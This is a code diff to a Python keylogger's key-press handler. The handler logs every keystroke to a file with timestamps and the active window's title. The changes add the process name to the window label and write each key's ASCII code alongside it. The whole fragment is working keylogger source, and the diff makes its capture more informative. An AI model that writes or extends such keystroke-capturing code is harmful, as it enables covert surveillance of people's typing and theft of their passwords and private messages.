@@ -23,8 +23,8 @@ def OnKeyPress(event):
     if time_event != datetime.datetime.now().strftime("%d/%m/%Y %H:%M"):
         time_event = datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
         recordKey.write("\nTime: {0}\n".format(time_event))
-    if window != str(event.WindowName):
-        window = str(event.WindowName)
+    if window != str(event.WindowName) + " - " + str(event.WindowProcName):
+        window = str(event.WindowName) + " - " + str(event.WindowProcName)
         recordKey.write("\nWindow Name: {0}\n".format(str(window)))
     if event.Ascii == 32:  # 32 is the ascii value of space
         kill_event = 0
@@ -40,7 +40,7 @@ def OnKeyPress(event):
     else:
         kill_event = 0
         if 33 <= event.Ascii <= 126:
-            recordKey.write(event.Key)
+            recordKey.write(str(event.Key) + "-" + str(event.Ascii))
         else:
             recordKey.write("<{0}>".format(str(event.Key)))
 
